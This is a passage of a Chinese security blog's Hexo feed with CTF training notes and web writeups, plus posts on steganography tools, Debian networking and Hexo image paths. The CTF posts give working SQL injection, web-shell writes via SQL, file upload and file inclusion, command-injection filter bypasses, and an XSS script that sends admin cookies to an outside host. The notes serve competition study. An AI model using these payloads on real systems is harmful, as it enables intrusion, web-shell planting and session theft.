<h2 id="mp3stego"><a href="#mp3stego" class="headerlink" title="mp3stego"></a>mp3stego</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Decode.exe -X -P [password] [file.mp3]</span><br></pre></td></tr></table></figure>

<h2 id="outguess-linux"><a href="#outguess-linux" class="headerlink" title="outguess(linux)"></a>outguess(linux)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./configure &amp;&amp; make &amp;&amp; make install</span><br><span class="line">outguess -r angrybird.jpg outfile.txt</span><br></pre></td></tr></table></figure>

<h2 id="stegdetect"><a href="#stegdetect" class="headerlink" title="stegdetect"></a>stegdetect</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">stegdetect -tjpoi -s 10.0 [file.jpg]</span><br></pre></td></tr></table></figure>

<h2 id="steghide"><a href="#steghide" class="headerlink" title="steghide"></a>steghide</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">steghide.exe info [file.jpg]</span><br><span class="line">steghide.exe extract -sf [file.jpg]</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>隐写</tag>
      </tags>
  </entry>
  <entry>
    <title>debian系linux网卡设置</title>
    <url>/1085/</url>
    <content><![CDATA[<p>debian系linux网卡设置，自动获取&#x2F;静态地址。</p>
<p>wired unmanaged 报错解决方法。</p>
<span id="more"></span>

<h1 id="编辑网卡"><a href="#编辑网卡" class="headerlink" title="编辑网卡"></a>编辑网卡</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/network/interfaces</span><br></pre></td></tr></table></figure>

<ol>
<li>dhcp</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">auto eth0</span><br><span class="line">iface eth0 inet dhcp</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>static</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">auto eth0</span><br><span class="line">iface eth0 inet static</span><br><span class="line">address [ip]</span><br><span class="line">netmask [mask]</span><br><span class="line">gateway [gw]</span><br></pre></td></tr></table></figure>

<p>改完记得：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/init.d/networking restart</span><br></pre></td></tr></table></figure>

<p>再不行重启</p>
<h1 id="wired-unmanaged-报错"><a href="#wired-unmanaged-报错" class="headerlink" title="wired unmanaged 报错"></a>wired unmanaged 报错</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/NetworkManager/NetworkManager.conf</span><br></pre></td></tr></table></figure>

<p>修改<code>managed=false</code>为<code>managed=true</code>，最后：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">service network-manager restart</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全3x03】CTF8月竞赛学习----------厂家培训-8.2</title>
    <url>/1086/</url>
    <content><![CDATA[<p>厂家赛前培训。一些题型的坑点讲解。</p>
<p>SQL注入、文件上传、文件包含、代码执行、XSS注入。</p>
<span id="more"></span>

<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><ol>
<li>判断类型：</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">%</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>猜列数：</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">%</span><span class="string">&#x27; order by 3 #</span></span><br><span class="line"><span class="string">1%&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span> #</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>获取数据库名称:</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">%</span><span class="string">&#x27; union select 1,database() #</span></span><br></pre></td></tr></table></figure>

<ol start="4">
<li>本地flag文件：</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">%</span><span class="string">&#x27; union select 1,load_file(&quot;/flag&quot;), 3 #</span></span><br></pre></td></tr></table></figure>

<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>常见注释符：<code>#</code>、<code>--+</code>、<code>%23</code>。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.167</span><span class="number">.0</span><span class="number">.27</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span></span><br><span class="line"></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.167</span><span class="number">.0</span><span class="number">.27</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;--+</span></span><br><span class="line"><span class="string">http://192.167.0.27/sqli-labs/Less-5/?id=1&#x27;</span>#</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.167</span><span class="number">.0</span><span class="number">.27</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;%23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#猜长度，F12看network，猜对了延迟5秒返回包，猜错了秒回</span></span><br><span class="line"><span class="string">http://192.167.0.27/sqli-labs/Less-5/?id=1&#x27;</span> <span class="keyword">and</span> if(length(database())<span class="operator">=</span><span class="number">1</span>,sleep(<span class="number">5</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.167</span><span class="number">.0</span><span class="number">.27</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(length(database())=8,sleep(5),1) --+</span></span><br></pre></td></tr></table></figure>

<p>sql注入点可以直接写一个反弹shell：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">192.167</span>.<span class="number">0.1</span>:<span class="number">8801</span>/show.php?id=<span class="number">33.1</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="string">&#x27;&lt;?php @eval($_POST[pp]);?&gt;&#x27;</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span> into outfile <span class="string">&quot;/var/www/html/gt.php&quot;</span></span><br></pre></td></tr></table></figure>

<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="upload-labs-Pass18-时间竞争"><a href="#upload-labs-Pass18-时间竞争" class="headerlink" title="upload-labs Pass18 时间竞争"></a>upload-labs Pass18 时间竞争</h2><p>上传<code>123.php</code>，内容为生成下面的反弹shell，burp里intruder开500线程重复攻击，浏览器不断刷新访问还未被删除的<code>123.php</code>，直至反弹shell创建成功：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;gt.php&#x27;</span>, <span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[cmd]);?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><p>代码审计中发现有<code>include</code>函数的程序时需注意文件包含漏洞：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>文件包含访问路径为：<br><a href="http://192.167.0.27/upload-labs/upload/i.php?file=4717.png">http://192.167.0.27/upload-labs/upload/i.php?file=4717.png</a></p>
<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><p>linux命令三种中断符：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">|| <span class="comment">#前面的命令正确即中断</span></span><br><span class="line">; <span class="comment">#全部命令均执行</span></span><br><span class="line">&amp;&amp; <span class="comment">#全部命令均执行</span></span><br></pre></td></tr></table></figure>

<p>绕过命令过滤方式：</p>
<ol>
<li>加转义符<code>\</code></li>
<li>使用通配符<code>?</code>、<code>*</code>(如果存在多个符合通配的文件名则无效)</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#原命令</span></span><br><span class="line"><span class="built_in">cat</span> /flag.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#加转义绕过过滤</span></span><br><span class="line">\c\a\t \/\f\l\a\g\.\t\x\t</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用通配符</span></span><br><span class="line"><span class="built_in">cat</span> /f?ag.txt   <span class="comment"># ?单字符</span></span><br><span class="line"><span class="built_in">cat</span> /f*g.txt    <span class="comment"># *多字符</span></span><br></pre></td></tr></table></figure>

<h1 id="XSS注入"><a href="#XSS注入" class="headerlink" title="XSS注入"></a>XSS注入</h1><p>反弹管理员cookie：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	var img = document.createElement(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">	img.src = <span class="string">&quot;http://192.167.0.233:4444/a?&quot;</span> + escape(document.cookie);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全3x04】CTF8月竞赛学习----------厂家培训-8.3</title>
    <url>/1087/</url>
    <content><![CDATA[<p>厂家赛前培训。一些题型的坑点讲解。</p>
<p>常见字符编码，文件隐写，开启日志记录。</p>
<span id="more"></span>

<h1 id="字符编码"><a href="#字符编码" class="headerlink" title="字符编码"></a>字符编码</h1><h2 id="ASCII-编码"><a href="#ASCII-编码" class="headerlink" title="ASCII 编码"></a>ASCII 编码</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ord(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">&gt;97</span><br><span class="line"></span><br><span class="line">chr(97)</span><br><span class="line">&gt;<span class="string">&#x27;a&#x27;</span></span><br><span class="line"></span><br><span class="line">int(<span class="string">&#x27;ff&#x27;</span>,16)</span><br><span class="line">&gt;255</span><br></pre></td></tr></table></figure>

<h2 id="baseXX-编码"><a href="#baseXX-编码" class="headerlink" title="baseXX 编码"></a>baseXX 编码</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#kali自带命令行解密</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;加密字符串&#x27;</span> | <span class="built_in">base64</span> -d</span><br><span class="line"></span><br><span class="line"><span class="comment">#python函数</span></span><br><span class="line">base64.b64decode(<span class="string">&#x27;加密字符串&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="shellcode-编码"><a href="#shellcode-编码" class="headerlink" title="shellcode 编码"></a>shellcode 编码</h2><p>示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">\x54\x68\x65\x7f\x71\x75\x69\x63\x6b\x7f\x62\x72\x6f\x77\x6e\x7f\x66\x6f\x78\x7f\x6a\x75\x6d\x7</span><br><span class="line">0\x73\x7f\x6f\x76\x65\x72\x7f\x74\x68\x65\x7f\x6c\x61\x7a\x79\x7f\x64\x6f\x67</span><br></pre></td></tr></table></figure>

<h2 id="XXencode-编码"><a href="#XXencode-编码" class="headerlink" title="XXencode 编码"></a>XXencode 编码</h2><p>相比base64字符表多一个<code>-</code>少一个<code>/</code></p>
<h2 id="UUencode-编码"><a href="#UUencode-编码" class="headerlink" title="UUencode 编码"></a>UUencode 编码</h2><p>UUencode是一种二进制到文字的编码，最早在unix 邮件系统中使用，全称：<br>Unix-to-Unix encoding，UUencode将输入文本以每三个字节为单位进行编码，如果<br>最后剩下的资料少于三个字节，不够的部份用零补齐。三个字节共有24个Bit，以6-<br>bit为单位分为4个组，每个组以十进制来表示所出现的字节的数值。这个数值只会<br>落在0到63之间。然后将每个数加上32，所产生的结果刚好落在ASCII字符集中可打<br>印字符（32-空白…95-底线）的范围之中。</p>
<h2 id="URL-编码"><a href="#URL-编码" class="headerlink" title="URL 编码"></a>URL 编码</h2><p>url编码又叫百分号编码，是统一资源定位(URL)编码方式。URL地址（常说网址）<br>规定了常用地数字，字母可以直接使用，另外一批作为特殊用户字符也可以直接用<br>（&#x2F;,:@等），剩下的其它所有字符必须通过%xx编码处理。 现在已经成为一种规范<br>了，基本所有程序语言都有这种编码，如js：有encodeURI、encodeURIComponent，<br>PHP有 urlencode、urldecode等。编码方法很简单，在该字节ascii码的的16进制字符<br>前面加%. 如 空格字符，ascii码是<code>32</code>，对应16进制是<code>&#39;20&#39;</code>，那么urlencode编码结果<br>是:<code>%20</code>。</p>
<h2 id="Unicode-编码"><a href="#Unicode-编码" class="headerlink" title="Unicode 编码"></a>Unicode 编码</h2><p>Unicode编码有以下四种编码方式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">源文本： The</span><br><span class="line">&amp;<span class="comment">#x [Hex]： &amp;#x0054;&amp;#x0068;&amp;#x0065;</span></span><br><span class="line">&amp;<span class="comment"># [Decimal]： &amp;#00084;&amp;#00104;&amp;#00101;</span></span><br><span class="line">\U [Hex]： \U0054\U0068\U0065</span><br><span class="line">\U+ [Hex]： \U+0054\U+0068\U+0065</span><br></pre></td></tr></table></figure>

<h2 id="Escape-x2F-Unescape编码"><a href="#Escape-x2F-Unescape编码" class="headerlink" title="Escape&#x2F;Unescape编码"></a>Escape&#x2F;Unescape编码</h2><p>Escape&#x2F;Unescape加密解码&#x2F;编码解码,又叫%u编码，采用UTF-16BE模式， Escape<br>编码&#x2F;加密,就是字符对应UTF-16 16进制表示方式前面加<code>%u</code>。Unescape解码&#x2F;解密，<br>就是去掉<code>&quot;%u&quot;</code>后，将16进制字符还原后，由utf-16转码到自己目标字符。如：字符<br><code>“中”</code>，UTF-16BE是：<code>“6d93”</code>，因此Escape是<code>“%u6d93”</code>。</p>
<h2 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h2><h2 id="摩尔斯电码"><a href="#摩尔斯电码" class="headerlink" title="摩尔斯电码"></a>摩尔斯电码</h2><h1 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h1><h2 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h2><h3 id="频谱图"><a href="#频谱图" class="headerlink" title="频谱图"></a>频谱图</h3><p>波形图转频谱图即可</p>
<h3 id="波形图"><a href="#波形图" class="headerlink" title="波形图"></a>波形图</h3><ol>
<li>01高低电平对应ascii编码(0~127对应7bit)&#x2F;曼彻斯特编码</li>
<li>长短音频段对应摩斯电码</li>
</ol>
<h3 id="播放音频"><a href="#播放音频" class="headerlink" title="播放音频"></a>播放音频</h3><p>听声音中的长短对应摩斯电码</p>
<h2 id="文档隐写"><a href="#文档隐写" class="headerlink" title="文档隐写"></a>文档隐写</h2><h3 id="word"><a href="#word" class="headerlink" title="word"></a>word</h3><ol>
<li>选项 - 隐藏字符</li>
<li>binwalk解包</li>
</ol>
<h3 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h3><ol>
<li><code>ctrl+A</code>查看隐藏内容</li>
<li>pdf编辑器移开图片</li>
<li>binwalk解包</li>
</ol>
<h3 id="html"><a href="#html" class="headerlink" title="html"></a>html</h3><ol>
<li>右键源码</li>
<li><code>ctrl+U</code></li>
<li><code>view-source:</code></li>
</ol>
<h3 id="数据隐藏"><a href="#数据隐藏" class="headerlink" title="数据隐藏"></a>数据隐藏</h3><ol>
<li>挂载后查找</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mount [源文件] mountpoint/</span><br><span class="line">umount mountpoint/</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>字符串匹配</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">strings [源文件] | grep -i <span class="string">&#x27;flag&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h3><ol>
<li>查看图片信息</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exiftool [file.jpg]</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><code>binwalk</code>解包</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">binwalk [源文件]</span><br><span class="line">binwalk -e [源文件] </span><br></pre></td></tr></table></figure>

<ol start="3">
<li><code>winhex</code>修改文件头</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">89 50 4E 47   --- PNG</span><br></pre></td></tr></table></figure>

<h3 id="压缩包隐写"><a href="#压缩包隐写" class="headerlink" title="压缩包隐写"></a>压缩包隐写</h3><ol>
<li><p>暴力破解</p>
</li>
<li><p>伪加密</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">     00 01 02 03 04 05 06 07</span><br><span class="line">00   50 4B 03 04 14 00 00 00</span><br><span class="line">                      [加密位]</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><p>明文攻击</p>
</li>
<li><p>crc32碰撞</p>
</li>
</ol>
<h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>wireshark</p>
<ul>
<li>筛选</li>
<li>追踪流</li>
<li>导出文件</li>
</ul>
<h1 id="开启日志记录"><a href="#开启日志记录" class="headerlink" title="开启日志记录"></a>开启日志记录</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tail</span> -f /var/log/apache2/access.log</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全3x06】CTF8月竞赛学习----------技能竞赛 web部分writeup</title>
    <url>/1090/</url>
    <content><![CDATA[<p>技能竞赛的writeup。</p>
<span id="more"></span>

<h1 id="php弱类型"><a href="#php弱类型" class="headerlink" title="php弱类型"></a>php弱类型</h1><p>由于php会把<code>0e....</code>格式的md5密文当数字0(科学计数法0的n次方依旧为0)来比对，因此会存在不同明文在php中验证md5相同的问题。</p>
<p>常见md5密文验证相同串：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;240610708&#x27;</span>) == <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;QNKCDZO&#x27;</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;aabg7XSs&#x27;</span>) == <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;aabC9RqS&#x27;</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">sha1</span>(<span class="string">&#x27;aaroZmOK&#x27;</span>) == <span class="title function_ invoke__">sha1</span>(<span class="string">&#x27;aaK1STfY&#x27;</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">sha1</span>(<span class="string">&#x27;aaO8zKZF&#x27;</span>) == <span class="title function_ invoke__">sha1</span>(<span class="string">&#x27;aa3OFF9m&#x27;</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;0010e2&#x27;</span> == <span class="string">&#x27;1e3&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;0x1234Ab&#x27;</span> == <span class="string">&#x27;1193131&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;0xABCdef&#x27;</span> == <span class="string">&#x27; 0xABCdef&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h1 id="php代码审计"><a href="#php代码审计" class="headerlink" title="php代码审计"></a>php代码审计</h1><p>右键源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CLsI</span>(<span class="params"><span class="variable">$ZzvSWE</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$ZzvSWE</span> = <span class="title function_ invoke__">gzinflate</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$ZzvSWE</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$ZzvSWE</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$ZzvSWE</span>[<span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$ZzvSWE</span>[<span class="variable">$i</span>]) - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ZzvSWE</span>;</span><br><span class="line">&#125;<span class="keyword">eval</span>(<span class="title function_ invoke__">CLsI</span>(<span class="string">&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;</span>));</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<p>修改源码注释符，<code>eval</code>改<code>echo</code>，放在本地跑即可。</p>
<h1 id="http请求头伪造"><a href="#http请求头伪造" class="headerlink" title="http请求头伪造"></a>http请求头伪造</h1><h2 id="浏览器伪造"><a href="#浏览器伪造" class="headerlink" title="浏览器伪造"></a>浏览器伪造</h2><p>burpsuite截包：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">User-Agent: CTF_coffee</span><br></pre></td></tr></table></figure>

<h2 id="本机IP伪造"><a href="#本机IP伪造" class="headerlink" title="本机IP伪造"></a>本机IP伪造</h2><p>burpsuite截包：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1</span><br></pre></td></tr></table></figure>

<h2 id="本机端口伪造"><a href="#本机端口伪造" class="headerlink" title="本机端口伪造"></a>本机端口伪造</h2><p>burp做不到了，只能换curl伪造：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl http://192.167.11.11:8006/ --header <span class="string">&#x27;X-Forwarded-For:127.0.0.1&#x27;</span> --header <span class="string">&#x27;User-Agent: CTF_coffee&#x27;</span> --local-port 23333</span><br></pre></td></tr></table></figure>

<h1 id="login爆破"><a href="#login爆破" class="headerlink" title="login爆破"></a>login爆破</h1><p>一般不给用户名的提示都按admin&#x2F;root来试</p>
<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>文件包含路径反弹shell：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.167.11.11:8802/index.php?file=data://text/plain,&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[gt]);?&gt;</span><br></pre></td></tr></table></figure>

<p>如果被过滤，可以尝试将一句话木马写入到日志里，再对日志进行包含：</p>
<p>先使用burp抓包，改请求为<code>GET &lt;?php @eval($_POST[gt]);?&gt;</code>，发送即可将一句话木马写入log日志。</p>
<p>之后开启菜刀&#x2F;蚁剑，访问包含路径<a href="http://192.167.11.11:8802/index.php?file=/var/log/apache2/access.log">http://192.167.11.11:8802/index.php?file=/var/log/apache2/access.log</a> 即可反弹shell。</p>
<h1 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a>命令执行绕过</h1><p>输入框只接收ip地址，回显一个ping的结果，尝试绕过执行其它命令：</p>
<ol>
<li>分隔符：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">| || &amp; &amp;&amp; ; </span><br><span class="line">前面加正常ip/错误ip/不加内容</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>查看命令：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> more <span class="built_in">head</span> <span class="built_in">tail</span> <span class="built_in">tac</span> less</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>加反斜杠：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span>  =&gt;   \c\a\t</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>双写绕过：</li>
</ol>
<p>针对单次过滤</p>
<ol start="5">
<li>写入cat命令绕过</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">;&gt;cacatt <span class="comment">#写入空文件,双写绕过cat字段过滤</span></span><br><span class="line">;* ../key.php <span class="comment">#*匹配第一个文件名</span></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全3x05】CTF8月竞赛学习----------厂家培训-练习赛writeup</title>
    <url>/1088/</url>
    <content><![CDATA[<p>练习赛的writeup。</p>
<p>太菜了，四道web就搞出来一个。</p>
<p>sql的已经注入了不会弹shell，文件包含也是不会在路径中插入命令，文件上传要学的就更多了，后缀过滤、类型过滤、文件头过滤、文件大小过滤、包内容过滤。</p>
<span id="more"></span>

<h1 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>sql注入生成shell：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">sqlmap -u [url] --os-shell</span><br></pre></td></tr></table></figure>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>包含反弹shell：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">/?file=data:<span class="comment">//text/plain,&lt;?php @eval($_POST[gt]);?&gt;</span></span><br><span class="line"></span><br><span class="line">/?file=php:<span class="comment">//input</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><ol>
<li>后缀黑名单绕过 <code>.pht</code></li>
<li>文件大小绕过 复制粘贴</li>
<li>文件头过滤 <code>GIF89a</code></li>
<li>包内容过滤 双写绕过<code>&lt;?php @eval</code> &#x3D;&gt; <code>&lt;&lt;??pphphp @eevalval</code></li>
</ol>
]]></content>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>【解决hexo插入图片后本地路径与部署路径不同的问题】</title>
    <url>/1091/</url>
    <content><![CDATA[<p>本地编辑md时插入的本地图片，在hexo部署后却不能正常显示。根本原因是hexo在部署的时候对图片的路径进行了xjb修改，加了一层同名目录。</p>
<p>之前一直是迁就了部署目录存放图片，这样导致本地编辑时不能正常预览图片。最近有大量文章需要本地浏览，看不了图太伤了，百度了一下，其实方法也很简单，这个周末把之前的博文全部替换一下图片路径。</p>
<span id="more"></span>

<h1 id="安装插件hexo-asset-image"><a href="#安装插件hexo-asset-image" class="headerlink" title="安装插件hexo-asset-image"></a>安装插件hexo-asset-image</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install https://github.com/CodeFalling/hexo-asset-image --save</span><br></pre></td></tr></table></figure>

<p><img src="/1091/1.png"></p>
<p>注意：<strong>不要使用npm install hexo-asset-image –save这个命令安装,版本号不对</strong></p>
<p><img src="/1091/2.png"></p>
<p>最直观的感受是映射关系有差别：</p>
<p>0.0.5版本</p>
<p><img src="/1091/3.png"></p>
<p>1.0.0版本</p>
<p><img src="/1091/4.png"></p>
<h1 id="配置-config-yml"><a href="#配置-config-yml" class="headerlink" title="配置_config.yml"></a>配置_config.yml</h1><p>修改文件<code>_config.yml</code>里的<code>post_asset_folder:</code>这个选项设置为<code>true</code></p>
<p>修改之后，再使用<code>hexo n &quot;hexo 本地图片不显示&quot;</code>时，目录的样子是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo 本地图片不显示</span><br><span class="line">├── 01.jpg</span><br><span class="line">├── 02.jpg</span><br><span class="line">└── 03.jpg</span><br><span class="line">...</span><br><span class="line">hexo 本地图片不显示.md</span><br></pre></td></tr></table></figure>
<h1 id="图片引用"><a href="#图片引用" class="headerlink" title="图片引用"></a>图片引用</h1><p>在md使用如下形式引用图片：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">![01](hexo 本地图片不显示/01.jpg)</span><br></pre></td></tr></table></figure>

<p>注意 这里要使用<code>/</code></p>
<p>使用以下命令发布博客：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo cl</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>

